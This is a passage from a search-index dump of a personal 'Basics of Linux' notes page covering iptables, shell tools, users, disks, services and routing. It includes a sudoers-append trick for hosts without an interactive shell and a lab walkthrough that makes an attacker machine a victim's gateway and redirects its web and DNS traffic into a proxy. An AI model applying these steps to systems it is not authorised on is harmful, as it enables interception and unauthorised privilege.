DROP iptables --policy FORWARD DROP Okay, so let's block out some connections. To do that we want to add/append a new rule. We want to block all connections from our enemy 192.168.1.30. # A for append, and S for source. iptables -A INPUT -s 192.168.1.30 -j DROP # Block an entire range iptables -A INPUT -s 192.168.1.0/24 -j DROP Now if we want to see our current rules we just do iptables -L And we can now see our new rule. To add line-numbers for each rule, so that you can then specify which rule you want to reset or change or something you can output the rluels with line-numbers iptables -L -v --line-numbers Remove/delete a rule To remove a rule you just do # Remove one specific rule iptables -D INPUT 2 # Remove all rules iptables -F Save your changes Your changes will only be saved and therefore in action until you restart iptables. So they will disappear every time you reboot unless you save the changes. To save the changes on ubuntu you do sudo /sbin/iptables-save Measuring bandwidth usage # There are a few different tools in hour arsenal that we can use to measure bandwidth usage. We will start with iptables. To view the input and output traffic we just list the rules with some verbosity. iptables -L -v # Stdout Chain INPUT (policy ACCEPT 6382 packets, 1900K bytes) pkts bytes target prot opt in out source destination Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 4266 packets, 578K bytes) pkts bytes target prot opt in out source destination So clean this up and reset the count we can do the following # Restar the count iptables -Z # Remove all the rules, FLUSH them iptables -F So now we just need to add our rules. A simple script for this would be #!/bin/bash iptables -F iptables -I INPUT 1 -p tcp -j ACCEPT Then check out the traffc with iptables -L -v --line-numbers Examples # Block outgoing connections to a specific ip iptables -A OUTPUT -d 198.1.1.1 -j DROP https://www.digitalocean.com/community/tutorials/how-to-list-and-delete-iptables-firewall-rules Troubleshooting # Have you tried turning it on and off? # I have had problems with the network-adapter not starting or something like that, on Ubuntu. You can try to restart the network manager if this happens: sudo service network-manager restart Magical rfkill # If for some reason the wifi is blocked you can unblock it (or block it) with rfkill. $ rfkill list 0: phy0: Wireless LAN Soft blocked: no Hard blocked: no 2: hci0: Bluetooth Soft blocked: no Hard blocked: no To block or unblock the phy0 from the example above you do: # Block rfkill block 0 # Unblock rfkill unblock 0 If there is a hard block it means that there is a physical switch on you machine that you need to switch off. DNS # Another rather messy area is DNS. The reason for this is that we have a few different players here, /etc/resolv.conf , resolvconf , dnsmasq and the dreaded NetworkManager . References # https://linuxjourney.com/ https://github.com/jlevy/the-art-of-command-line","title":"Basics of Linux"},{"location":"basics_of_linux/basics_of_linux/#basics-of-linux","text":"This is a huge chapter. I could divide it up in many subchapters but I like to have it all at one place so I can just do ctr-f , and search for whatever I am looking for.","title":"Basics of linux"},{"location":"basics_of_linux/basics_of_linux/#1-the-shell-bash","text":"The shell, or the terminal is a really useful tool. Bash is the standard shell on most Linux distros. One really useful trick when working with bash is to search for old commands that you have used. You can access this search function by doing ctr-r in the terminal. The configuration file for the bash shell is ~./bashrc","title":"1. The Shell - Bash"},{"location":"basics_of_linux/basics_of_linux/#navigating","text":"pwd - Print working directory cd - Change directory cd ~ - Change directory to your home directory cd - - Go back to previous directory","title":"Navigating"},{"location":"basics_of_linux/basics_of_linux/#looking-at-files","text":"ls - List files in directory ls -ltr - Sort list by last modified. -time -reverse file - Show info about file. What type of file it is. If it is a binary or text file for example. cat - Output content of file. less - Output file but just little bit at a time. Use this one. Not more . Use /searchterm to search. It is the same command as in vim. n to scroll to next search result. Press q to quit. more - Output file but just little bit at a time. less is better.","title":"Looking at files"},{"location":"basics_of_linux/basics_of_linux/#working-with-files","text":"touch - Create a new file. cp - Copy mkdir - Make directory. # Make entire directory structure mkdir -p new/thisonetoo/and/this/one rm - Remove file # Remove recursively and its content. Very dangerous command! rm -rf ./directory Watch the command destroy an entire machine: https://www.youtube.com/watch?v=D4fzInlyYQo rmdir - Remove empty directory","title":"Working with files"},{"location":"basics_of_linux/basics_of_linux/#a-little-bit-of-everything","text":"history - Show commands history sudo List what rights the sudo user has. sudo -l Sudo config file is usually /etc/sudoers","title":"A little bit of everything"},{"location":"basics_of_linux/basics_of_linux/#finding-files","text":"There are mainly three ways to find files on Linux: find , locate , and which .","title":"Finding files"},{"location":"basics_of_linux/basics_of_linux/#find","text":"Find is slower than locate but a lot more thorough. You can search for files recursively and with regex and a lot of other features. # This will send all permissions denied outputs to dev/null. find / -name file 2>/dev/null # Search incasesensitive, that contains the word file. find / -iname *file* 2>/dev/null","title":"Find"},{"location":"basics_of_linux/basics_of_linux/#locate","text":"Locate is really fast because it relies on an internal database. So in order to have it updated you need to run: sudo updatedb Then you can easily find stuff like this: locate filename","title":"Locate"},{"location":"basics_of_linux/basics_of_linux/#which","text":"Outputs the path of the binary that you are looking for. It searches through the directories that are defined in your $PATH variable. which bash # Usually outputs: /bin/bash","title":"Which"},{"location":"basics_of_linux/basics_of_linux/#creating-custom-bash-functions","text":"If you want to create a new command from other commands, and be able to invoke that command from your terminal, there are a few different way of doing that. One way is write a bash-script, and then move that script to one of your folders in your $PATH variable. The other way is to simply write a function in your .bashrc file. You can then invoke that function from anywhere in your terminal. So for example, if you want to ssh into a machine, but you are tired of having to write the whole command, you can just add this function in your .basrhrc file: function connecttossh { ssh user@192.168.1.111 } Then you need to source the file, so that it becomes updated: source ./.bashrc Now you can just write connecttossh and the function will be executed.","title":"Creating custom bash functions"},{"location":"basics_of_linux/basics_of_linux/#2-editing-text","text":"First let's just clear out something about standard streams , or I/O -streams. Standard streams are the streams that are used to interact between the human computer-user and the machine. There are three standard streams: standard input (stdin), standard output (stdout), and standard error (stderr).The stdin stream can be seen as an abstractions of the real keyboard input. So when you issue a command/program that requires input the program does not read straight from the keyboard input, instead it reads from the file STDIN.","title":"2. Editing text"},{"location":"basics_of_linux/basics_of_linux/#stdin","text":"Stdin is the data that gets inputed into the program. An example of a program that requires stdin data is cp . In order for the program to do anything it needs input data. For example cp file1 copy_of_file1 . Here file1 and copy_of_file1 is the stdin. So the default Stdin comes from the STDIN-file that is a text-file representation of the keyboard input. But often times we do not want to input stuff from the keyboard, sometimes we want to input something into a program that comes from another file. That is when we can use redirection symbol: > . So an example could be cat < my_text_file.txt . The data from my_text_file.txt will now be used as input instead of the keyboard input. The file descriptor for stdin is: 0","title":"Stdin"},{"location":"basics_of_linux/basics_of_linux/#stdout","text":"Stdout is the data that get ouputed from the program. For example, when you use the command cat file1 that data/text that gets outputed is the stdout The same with the program ls . Not all programs have stdout. For example when you use mv or cp successfully you get no stdout back from the program. The stdout can be redirected to another file by using these symbols > and >> . So now we can do the following: ls > result_of_ls.txt # now the result will be written to the file result_of_ls.txt ls >> result_of_ls.txt # This will append the data to the bottom of the file result_of_ls.txt Another incredibly useful feature is the pipe feature, reprsented with this symbol | . It will take the stdout and redirect it into another program. Here is an example: ls -la | less This will take the stdout from ls -la and forward/redirect it into the less program. Using the pipe you can now chain different commands. The file descriptor for stdout is: 1","title":"Stdout"},{"location":"basics_of_linux/basics_of_linux/#stderr","text":"Stderr is the stream used for outputting error messages. So if a program fails for whatever reason. For example, if we try to copy a file that does not exist, this will be the stdrr output: cp thisfiledoesnotexist aaaaaaaaaa cp: cannot stat 'thisfiledoesnotexist': No such file or directory This is a common way for stderr to present itself, just straight out into the terminal. But sometimes stderr gets sent to a log file. Stderr is useful because with it we can separate between stdout and stderr . However, to the eye it might be difficult to distinguish what output is stdout and what output is stderr . One easy way to determine is the output is stderr or stdout is to simply redirect it into a file. Because by default you only redirect stdout , and not stderr . cp thisfiledoesnotexist aaaaaaaaaa > result.txt cp: cannot stat 'thisfiledoesnotexist': No such file or directory # If we now look at result.txt we will find that it is empty. Since the error-text we recieved could not be redirected into the textfile, since it is stderr and not stdout.","title":"Stderr"},{"location":"basics_of_linux/basics_of_linux/#filters","text":"There are certain programs that are especially useful to use together with pipes. They can also be used as stand-alone programs but you will often see them together with pipes. sort sort test.txt uniq To remove any duplicated lines and output all lines but only once. sort -u test.txt sort test.txt | uniq cat filename | sort -u > newFileName grep head tail tr sed","title":"Filters"},{"location":"basics_of_linux/basics_of_linux/#editing-text","text":"","title":"Editing text"},{"location":"basics_of_linux/basics_of_linux/#sed","text":"Can perform basic editing on streams, that is to say, text. Remove first line of file/stream sed \"1d\"","title":"sed"},{"location":"basics_of_linux/basics_of_linux/#cut","text":"Cut by column This is a useful command to cut in text. Let's say that we have the following text, and we want to cut out the ip-address. 64 bytes from 192.168.0.1: icmp_req=1 ttl=255 time=4.86 ms cut -d\" \" -f4 -d stands for delimiter. and -f for field.","title":"cut"},{"location":"basics_of_linux/basics_of_linux/#tr-translate","text":"Transform all letter into capital letters tr \"[:lower:]\" \"[:upper:]\" < file1 > file2 Example Remove character # Remove characters cat file.txt | tr -d \".\" # Remove and replace # Remove all dots and replace them with underscore. cat file.txt | tr \".\" \"_\" http://www.thegeekstuff.com/2012/12/linux-tr-command/","title":"tr - Translate"},{"location":"basics_of_linux/basics_of_linux/#awk","text":"So awk is an advanced tool for editing text-files. It is its own programming language to it can become quite complex. Awk iterates over the whole file line by line. This is the basic structure of an awk command awk '/search_pattern/ { action_to_take_on_matches; another_action; }' file_to_parse The search pattern takes regex. You can exclude the search portion or the action portion. This just prints every line of the file. awk '{print}' filename Filtering out specific ip-address: awk '/172.16.40.10.81/' error.log Now we want to print out the fourth column of that file, we can just pipe this to cut, but we can also use awk for it, like this: awk '/172.16.40.10.81/ {print $4}' error.log # Another example awk '{print $2,$5;}' error.txt This prints columns 2 and 5. We can use the -F flag to add a custom delimiter. awk -F ':' '{print $1}' test.txt So if you are manipulating some text you might want to start the output with some info about the columns or something like that. To do that we can use the BEGIN-keyword. awk 'BEGIN {printf \"IP-address \\tPort\\n\"} /nop/ {print $3}' test.txt | head awk 'BEGIN{printf \"IP-address \\tPort\\n\"} /nop/ {print $3} END {printf \"End of the file\\n\"}' test.txt | tail Here we are printing IP-address PORT to the first line of the file.","title":"awk"},{"location":"basics_of_linux/basics_of_linux/#3-user-management","text":"There are two commands to add a user in linux: adduser or useradd. adduser is a perl-script that facilitate the process, and useradd is the native linux binary. To add a user we do: adduser NameOfUser useradd nameOfUser To add user to sudo-group: adduser NameOfUser sudo usermod -aG sudo NameOfUser You might have to reboot for it to take effect. On some machines we might not be able to edit the sudoers file because we don't have an interactive shell, in this case can you can just redirect the text into the file, like this: echo \"username ALL=(ALL) ALL\" >> /etc/sudoers Check which users are in the sudo group: cat /etc/group | grep sudo Switch user in terminal: su NameOfUser Remove/delete user: sudo userdel NameOfUser","title":"3. User management"},{"location":"basics_of_linux/basics_of_linux/#4-permissions","text":"ls -la Shows all the files and directories and their permission settings. drwxrwxrwt 2 root root 4,0K ago 3 17:33 myfile Here we have 10 letters in the beginning. The first one d shows that it is a directory. The next three letters are for read, w for write and x for execute. The first three belong to the owner, the second three to the group, and the last three to all users. https://linuxjourney.com/lesson/file-permissions","title":"4. Permissions"},{"location":"basics_of_linux/basics_of_linux/#5-processes","text":"To display information regarding the systems processes you can use the ps command. ps -aux -a stands for all -u stands for all processes by all users -x stands for all processes that don't run a tty If you run this command you will probably see a pretty big output. In the column for command you will see what command has been run. Every process has a Process Identification Number ( PID ). Something you will also see in the output. All of theses processes can actually be found in /proc . You just go to /proc/[pid] . In /proc you can find information about the system, and you can actually change the system if you change those files! But more on that later. What I wanted to explain is that if we look at the output from ps we see that some commands are in brackets. Like this: root 10 0.0 0.0 0 0 ? S ene14 0:00 [watchdog/0] root 11 0.0 0.0 0 0 ? S ene14 0:00 [watchdog/1] root 12 0.0 0.0 0 0 ? S ene14 0:00 [migration/1] root 13 0.0 0.0 0 0 ? S ene14 0:00 [ksoftirqd/1] Those are usually kernel processes, and you can safely assume that no user has started them. If you want to monitor processes in real time you can use top or htop . top comes preinstalled on most distros. But htop is really a lot nicer. For htop the F1-10 keys might trigger OS-events. So you can use the shortcuts instead. Shortcut Key Function Key Description h F1 Invoke htop Help S F2 Htop Setup Menu / F3 Search for a Process I F4 Invert Sort Order t F5 Tree View > F6 Sort by a column [ F7 Nice \u2013 (change priority) ] F8 Nice + (change priority) k F9 Kill a Process q F10 Quit htop http://www.thegeekstuff.com/2011/09/linux-htop-examples/","title":"5. Processes"},{"location":"basics_of_linux/basics_of_linux/#6-packages","text":"Something that difference Linux from windows is how it handles installing new software. In windows you usually have to google around and then click on random scary download buttons that might fuck up your computer, or not. It's like a constant lottery where you win by no installing malware. In Linux that is usually not really an issue. That is because distros have their own software repositories from where you can download your software. This is kind of like an app-store except everything is free. The different major branches of teh GNU/Linux OS have their own software repositories. Ubuntu has their own, debian has their own, and so on. Different distros also have their own package-amangers. For example, Debian and ubuntu uses apt , while Redhat uses rpm , and Arch uses pacman . You should strick to your own package-manager, because even though chaning package-manager is possible it will probably just cause you more headache than benefits.","title":"6. Packages"},{"location":"basics_of_linux/basics_of_linux/#install-package","text":"Example of how to install something with apt: sudo apt-get install nmap If you only have a .deb file you do this to install from the terminal: sudo dpkg -i /path/to/deb/file sudo apt-get install -f","title":"Install package"},{"location":"basics_of_linux/basics_of_linux/#remove-packages","text":"This can be tricky. First find the package dpkg --list Then you find it in your list. sudo apt-get --purge remove nameOfProgram When you remove some package it might have requires some other dependencies. To remove those you run sudo apt-get autoremove","title":"Remove packages"},{"location":"basics_of_linux/basics_of_linux/#organizing-your-path-variable","text":"I am talking about debian/ubuntu here. On other systems I don't know. You can define your path in /etc/environment . If you don't have it you can create it and add the path like this: source /etc/environment && export PATH If you are using zsh (which you should) you have to add it here sudo vim /etc/zsh/zshenv And add this line somewhere: source /etc/environment","title":"Organizing your $path variable"},{"location":"basics_of_linux/basics_of_linux/#adding-a-path","text":"This is a non-persistent way to add binaries to your path. Might be useful if you have entered a system that has limited binaries in the path. export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","title":"Adding a path"},{"location":"basics_of_linux/basics_of_linux/#installing-custom-packages","text":"If you download a package that is not in the official repository you can put the binary in /opt . That is good place to put your binaries. Now you need to add that path to your path-variable. Remember how we set that in /etc/environment . So now open up that file and add /opt to it, so i looks like this. PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/opt\" I always add custom binaries last. That means that if we have two binaries with the same name the machine will first select the original binary. This way you won't have to fear screwing up, by accidentally creating a new ls binary for example.","title":"Installing custom packages"},{"location":"basics_of_linux/basics_of_linux/#7-cronjobs","text":"There are two ways to configure cronjobs. The first one is by putting scripts in the following folders. /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly The second way is to write the command in the crontab # list cronjobs crontab -l # Edit or create new cronjobs crontab -e","title":"7. Cronjobs"},{"location":"basics_of_linux/basics_of_linux/#8-devicesdiskspartitions","text":"First some terminology. A drive is a physical storage device, just as a hard disk, solid state drive, or usb. In Linux these drives are represented as special file system objects called \"device\". They are found under /dev .A physical storage unit, a drive, can be divided up in to multiple logical storage units, these are called partitions . So they are just digital divisions of the drive. In linux a device are often named something like sda, sdb, sdc. And the partions of those devices are numbered. So one partion might be called sda1 , and another sda2 . These can then be found under /dev/sda1 and /dev/sda2 . You can view the devices and their partions with the command lsblk","title":"8. Devices/disks/partitions"},{"location":"basics_of_linux/basics_of_linux/#formating-disks","text":"If you want to do it the easy way, just open gnome-disks . To format disks we are going to use the program parted . It can be used with its own shell or by running commands. So you can just run parted, and you will enter the parted interface. But here we are going to run the commands instead. # Make sure you know which device you are working with, they can change name between boots lsblk Partition standard First we have to choose a partition standard. The modern and mostly used is gpt, and older is msdos. # This will destroy all the data on the on the disk sudo parted /dev/sda mklabel gpt Create a new partition sudo parted --align optimal /dev/sda mkpart primary ext4 0% 100% This command creates a new partition (mkpart), which is of type primary, that takes up the space between 0-100%. Which means we will only have one partition. Now you can see your new partition with lsblk . Format the partition with a specific filesystem Now that we have a partition we need to add a filesystem to it.There are many different types of filesystems. ext4 is common for linux. While windows uses NTFS, and mac uses HFS Plus. exFAT can be understood by all three OS:s, something that might be useful to USB:s. # For linux sudo mkfs.ext4 /dev/sda1 # Supposedly work on linux, mac and windows. But fails for me on my tests on Mac sudo mkfs.vfat /dev/sda1 # To use UDF (universal disk format) that should also work on all OS # You first need to install apt-get install udftools. Then you do: mkudffs /dev/sda1 Remove partition # if you want to remove partition 1 sudo parted /dev/sda rm 1 Mount it Now you can just mount the parition somewhere on your filesystem # Mount it sudo mkdir /mnt/here sudo mount /dev/sda1 /mnt/here # Unmount it sudo umount /mnt/here List all devices lsblk fdisk -l","title":"Formating disks"},{"location":"basics_of_linux/basics_of_linux/#encrypt-a-partition","text":"sudo cryptsetup luksFormat /dev/sda1 Mount an encrypted parition cryptsetup open /dev/sda1 backup Then you mount it: mount /dev/mapper/backup /media/username/back","title":"Encrypt a partition"},{"location":"basics_of_linux/basics_of_linux/#change-encryption-passphrase","text":"First find out which device is the encrypted device: lsblk # In type you will see \"crypt\" There are eight slots for passphrases. You can view these slots like this: sudo cryptsetup luksDump /dev/sda3 Add a key: sudo cryptsetup luksAddKey /dev/sda3 Remove a key: sudo cryptsetup luksRemoveKey /dev/sda3 # You are then prompted to input the key/passphrase you want to remove","title":"Change encryption passphrase"},{"location":"basics_of_linux/basics_of_linux/#formatting-a-usb","text":"In order to format a usb drive we have to do the following. If you have stored sensitive information, or otherwise want to make sure that it is not possible to read removed files from the USB you can overwrite the usb (or any other kind of disk) with zeroes, or just random data. So we can start by doing that, however, first we need to know the device name of the usb. First find out the name of the usb/device. We can to that by looking at the dmesg or tail -f var/log/syslog when we insert the usb. Another way is to run the command lsblk before and after inserting the USB. In my case the usb was called sda, , but for you it might be something else. Make sure you know exactly which device you are working with, otherwise you will completely detroythe wrong device. Then we need to unmount the usb. sudo umount /dev/sda Now we are ready to overwrite it with zeroes. It can be done like this: sudo dd if=/dev/zero of=/dev/sda bs=1k count=2048 status=progress Then we just write a new filesystem to the device: sudo mkfs.ext4 -L \"NameOfVolume\" /dev/sda ext4 works well with linux, vfat and ntfs should work with windows. sudo mkfs.vfat -n \"NameOfVolume\" /dev/sda","title":"Formatting a USB"},{"location":"basics_of_linux/basics_of_linux/#create-bootable-usb","text":"First find out the name of the device. Using dmesg , or lsblk , or something similar. sudo dd bs=4M if=/path/to/input.iso of=/dev/sdX conv=fdatasync status=progress That's it.","title":"Create bootable USB"},{"location":"basics_of_linux/basics_of_linux/#9-the-filesystem","text":"","title":"9. The Filesystem"},{"location":"basics_of_linux/basics_of_linux/#the-filesystem-hierarchy-standard","text":"This image is copied from here: http://askubuntu.com/questions/138547/how-to-understand-the-ubuntu-file-system-layout/138551#138551","title":"The Filesystem Hierarchy Standard"},{"location":"basics_of_linux/basics_of_linux/#difference-between-sbin-and-bin","text":"sbin is system binaries. A normal user do not have access to these binaries. It is only root and users with sudo privileges that do. pelle@mymachine:/bin$ ls -la /bin total 4092 drwxr-xr-x 2 root root 4096 2012-02-04 19:12 . drwxr-xr-x 21 root root 4096 2012-02-06 18:41 .. --snip-- -rwxr-xr-x 1 root root 27312 2008-04-04 02:42 cat -rwxr-xr-x 1 root root 45824 2008-04-04 02:42 chgrp -rwxr-xr-x 1 root root 42816 2008-04-04 02:42 chmod -rwxr-xr-x 1 root root 47868 2008-04-04 02:42 chown -rwxr-xr-x 1 root root 71664 2008-04-04 02:42 cp -rwxr-xr-x 1 root root 110540 2007-11-13 05:54 cpio -rwxr-xr-x 1 root root 79988 2009-03-09 09:03 dash -rwxr-xr-x 1 root root 24684 2008-04-04 02:42 echo -rwxr-xr-x 1 root root 40560 2008-02-29 02:19 ed -rwxr-xr-x 1 root root 96440 2007-10-23 16:58 egrep -rwxr-xr-x 1 root root 22192 2008-04-04 02:42 false -rwxr-xr-x 1 root root 5740 2008-02-06 17:49 fgconsole -rwxr-xr-x 1 root root 53396 2007-10-23 16:58 fgrep -rwxr-xr-x 1 root root 8796 2007-11-15 13:01 hostname We have echo, cp, grep. The normal stuff a user needs. In sbin we have binaries that control the system. ls -la /sbin total 5884 drwxr-xr-x 2 root root 4096 2012-02-04 10:01 . drwxr-xr-x 21 root root 4096 2012-02-06 18:41 .. -rwxr-xr-x 3 root root 23840 2008-03-27 13:25 findfs -rwxr-xr-x 1 root root 20020 2008-03-27 13:25 fsck -rwxr-xr-x 1 root root 15168 2008-09-26 08:43 getty -rwxr-xr-x 1 root root 375 2009-12-10 10:55 grub-install lrwxrwxrwx 1 root root 6 2012-02-04 09:51 halt -> reboot -rwxr-xr-x 1 root root 69228 2008-03-28 18:26 hdparm -rwxr-xr-x 1 root root 31620 2008-09-26 08:43 hwclock -rwxr-xr-x 1 root root 61808 2007-12-13 05:51 ifconfig -rwxr-xr-x 2 root root 27372 2007-09-19 20:25 ifdown -rwxr-xr-x 2 root root 27372 2007-09-19 20:25 ifup -rwxr-xr-x 1 root root 89604 2008-04-11 09:50 init -rwxr-xr-x 1 root root 47448 2008-01-28 08:49 ip6tables -rwxr-xr-x 1 root root 51680 2008-01-28 08:49 ip6tables-restore -rwxr-xr-x 1 root root 51644 2008-01-28 08:49 ip6tables-save -rwxr-xr-x 1 root root 10948 2007-12-13 05:51 ipmaddr -rwxr-xr-x 1 root root 47480 2008-01-28 08:49 iptables","title":"Difference between sbin and bin"},{"location":"basics_of_linux/basics_of_linux/#mount","text":"So everything on the linux-filesystem belongs to some part of the filesystem-tree. So if we plug in some device we need to mount it to the filesystem. That pretty much means that we need to connect it to the filesystem. Mount is like another word for connect. So if you want to connect a CD-rom or USB to your machine. You need to mount it to a specific path on the filesystem. So if you plug in the usb it might be accessible at /dev/usb . But that it not enough for you to be able to browse the usb content. You need to mount it. You do this by writing mount /dev/usb /media/usb Or whereever you want to mount it. So when you click on Eject or Safetly remove you are just unmounting. umount /media/usb Knowing how to mount and unmount might be useful if you want to get access to a remote NFS-directory. You will need to mount it to your filesystem to be able to browse it. It is possible that the disk is not known as /dev/usb . If that is the case you can run sudo fdisk -l And see if you can find your device, and look for the address. Then you mount it like this (or with the correct path) sudo mount /dev/sda1","title":"Mount"},{"location":"basics_of_linux/basics_of_linux/#mount-crypto-volume","text":"cryptsetup open /dev/sda1 backup Then you mount it: mount /dev/mapper/backup /media/username/back","title":"Mount crypto-volume"},{"location":"basics_of_linux/basics_of_linux/#create-your-of-filesystem","text":"In some cases it might be useful to create your own disk. Maybe for attaching to a virtual machine, or maybe to facilitate a backup. It is just a easy nice little container to have. It just requires two easy steps. Create a chunk in memory truncate -s 100MB nameOfFile Attach a filesystem to file mkfs.ext4 ./nameOfFile Mount it to your filesystem sudo mount ./nameOfFile /mnt/blabla","title":"Create your of filesystem"},{"location":"basics_of_linux/basics_of_linux/#10-controlling-services","text":"","title":"10. Controlling services"},{"location":"basics_of_linux/basics_of_linux/#systemctl","text":"Systemctl can be used to enable and disable various services on your linux machine. Start ssh systemctl start ssh systemctl status ssh systemctl stop ssh You can verify that the service is listening for connection by running network status. netstat -apnt Make ssh start upon boot systemctl enable ssh systemctl enable apache2","title":"Systemctl"},{"location":"basics_of_linux/basics_of_linux/#initd","text":"Init.d is just a wrapper around Systemctl. I prefer it. /etc/init.d/cron status /etc/init.d/cron start /etc/init.d/cron stop","title":"Init.d"},{"location":"basics_of_linux/basics_of_linux/#rcconf","text":"This is a tool to control services more easily, what is running upon boot and so on.","title":"rcconf"},{"location":"basics_of_linux/basics_of_linux/#11-kernel","text":"The Kernel is responsible for talking between the hardware and the software, and to manage the systems resources. The Linux Kernel is a monolithic kernel, unlike the OSX and the Windows kernels which are hybrid. You can find the kernel file in /boot . It might look like something like this vmlinuz-4.4.0-57-generic . In the beginning of time the kernel was simply called linux . But when Virtual Memory was introduced they changed the name to vmlinux to reflect that the kernel could handle virtual memory. When the kernel later became too big it was compressed using zlib , therefore the name was changed to vmlinuz . The Linux Kernel differs from Windows in that it contains drivers by default. So you don't have to go around looking for drivers like you do on windows when you want to install a printer, or something like that. It is really easy to upgrade to the latest Linux kernel, all you have to do tis this: sudo apt-get update && sudo apt-get dist-upgrade # or sudo apt-get update && sudo apt-get upgrade If you are using a distro that is Long Term Supported (LTS). You will not get the latest Kernel version, but you will get the latest Long Term Supported version.","title":"11. Kernel"},{"location":"basics_of_linux/basics_of_linux/#14-logging","text":"Logs can be viewed here on debian distros /var/log/","title":"14. Logging"},{"location":"basics_of_linux/basics_of_linux/#16-network-basics","text":"If you use standard desktop installation for Ubuntu or Debian you get NetworkManager included, which handles your network connections, wire and wireless. NetworkManager is made to be easy to use, and \"just work\". And most of the time it does. But sometimes when you want to configure stuff on your own, for whatever reason, it can be a hassle. So for the rest of this chapter I am just going to assume that you have stopped, removed or disabled NetworkManager. # Stop NetworkManager sudo systemctl stop NetworkManager.service # Start NetworkManager sudo systemctl start NetworkManager.service # Disable it so it won't start at boot sudo systemctl disable NetworkManager #Enable it so it will start at boot sudo systemctl disable NetworkManager Network cards (NIC) are identified by their mac address, hosts by theirip address andapplications by their port number.","title":"16. Network basics"},{"location":"basics_of_linux/basics_of_linux/#in-a-nutshell-what-you-need-to-know","text":"Things you really need to know are: # Configuration files /etc/network/interfaces /etc/resolve.config # Tools ip ip route dhclient wpa_supplicant iptables netstat dnsmasq","title":"In a nutshell what you need to know"},{"location":"basics_of_linux/basics_of_linux/#configure-network-interface-cards-40nic41","text":"On debian NIC:s are defined and configured in /etc/network/interfaces . # automatically start eth0 on boot auto eth0 # give the eth0 an ip through dhcp iface eth0 inet dhcp # start up the loopback interface auto lo iface lo inet loopback # A bridge called br1 - can be called whatever. # This bridge has a static ip auto br1 iface br1 inet static address 192.168.2.1 netmask 255.255.255.0 broadcast 192.168.2.255 bridge_ports none Take a interface up and down / start and stop It is recommended to take a interface down before configuring it. # ifup eth0 ifdown eth0 # You can also use ip sudo ip link set dev eth0 down sudo ip link set dev eth0 down # You can also use ifconfig to bring an interface up and down. The difference is that ifconfig # will use the current configuration, and not take into account changes from /etc/network/interfaces. # So use ifup and ifdown! ifconfig eth0 up ifconfig eth0 down Configure an interface with ip or ifconfig If you want to configure an interface only temporarly you can use ip and ifconfig . The changes will not survive a reboot. Ifconfig is old and deprecated on some systems. So use ip instead. But they do basically the same thing.","title":"Configure Network Interface Cards (NIC)"},{"location":"basics_of_linux/basics_of_linux/#route","text":"Where packets are send in a network depends on the routing of the routing. Every node that the packet passes in its travel to its destination has a routing table defined, that says where the packet should be directed next. The most simple example is how the traffic of a home network is sent to the router, and then from there forwarded on to somewhere else on the internet. How every host should forward the packets are defined in the linux kernel routing table. You can see the routing table by running this command: route ip route netstat -r I think that the most useful of these commands is route, since it includes the column names of the table. Here is an example of the output: Destination Gateway Genmask Flags Metric Ref Use Iface default 192.168.2.1 0.0.0.0 UG 0 0 0 ens3 192.168.2.0 0.0.0.0 255.255.255.0 U 0 0 0 ens3 So let's image that we don't have any routing rules at all. It is completely empty. Like this: Destination Gateway Genmask Flags Metric Ref Use Iface But we have network interface connected, called eth0. If we now try to ping the router (the gateway) on the network, we get this result: ~ ping 192.168.2.1 connect: Network is unreachable At this point we can't even add a route to the gateway. Because the network is unreacheable. So we need to hook outselfs up to the network first. route add -net 192.168.2.0 netmask 255.255.255.0 dev eth0 Now our table looks like this: Destination Gateway Genmask Flags Metric Ref Use Iface 192.168.2.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0 We still can't ping anything out in the internetz- That's because we are not reaching our gateway (router), since we haven't configured it yet. route add default gw 192.168.2.1 or ip route add default via 192.168.2.1 Remember that these routes will only be temporary.","title":"Route"},{"location":"basics_of_linux/basics_of_linux/#example-man-in-the-middle-a-host","text":"It is often useful to man in the middle all traffic from a machine, to see what requests and stuff it does. Let's say that the scenario is that the victim-machine is connected to the mitm-machine by ethernet cable. This can be either a physical cable or thought a virtual machine. Victim machine On the victim machine we don't have network-manager installed. And out /etc/network/interfaces has nothing in it except for: auto lo iface lo inet loopback When we run ip addr we get the following result: root@deb64:~# ip a 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens3: <BROADCAST,MULTICAST> mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000 link/ether 12:34:00:a9:fc:4a brd ff:ff:ff:ff:ff:ff So our network interface ens3 does not have an ip-address and it is down. So let's first give it an ip-address, now remember that this ip-address will only be temporary, and will disappear on next reboot. If you want to make it permanent you need to define it in /etc/network/interface Give interface an ip-address ip addr add 192.168.150.2/24 dev ens3 # Here we give it the ip-address 192.168.150.2 with netmask 255.255.255.0 (/24), and we # give it to the device/interface ens3 Now we can start the interface, or \"bring it up\" as it is called: ip link set ens3 up # ifup and ifdown will not work When we bring up the interface the routing table will automatically get populated. root@deb64:~# ip r 192.168.150.0/24 dev ens3 proto kernel scope link src 192.168.150.2 Add default gateway But we are still not able to reach the internet since we have not defined a default gateway yet. So let's do that. ip route add default via 192.168.150.1 dev ens3 If we look at the routing table now we can see our new default gateway. root@deb64:~# ip route default via 192.168.150.1 dev ens3 192.168.150.0/24 dev ens3 proto kernel scope link src 192.168.150.2 Now we are done setting up the victim machine. Attacking machine First we need to give our machine the ip-address of the default gateway, so that the victim will connect to the attacking machine. ip addr add 192.168.150.1/24 dev ens3 Now we just need to configure the NATing. iptables -t nat -A POSTROUTING -j ACCEPT This is all we have to do. If we now do a curl icanhazip.com from our victim machine, we can see the traffic flying by with tcpdump in our attacker-machine. However, we might want to inspect the traffic in burp-suite, or some other proxy tool. In ordet to do that we can redirect specific traffic into our proxy with the help of our friend iptables. iptables -t nat -A PREROUTING -i ens3 -s 192.168.150.2 -p tcp -m tcp --dport 443 -j REDIRECT --to-ports 8080 iptables -t nat -A PREROUTING -i ens3 -s 192.168.150.2 -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080 iptables -t nat -A PREROUTING -i ens3 -s 192.168.150.2 -p tcp -m tcp --dport 53 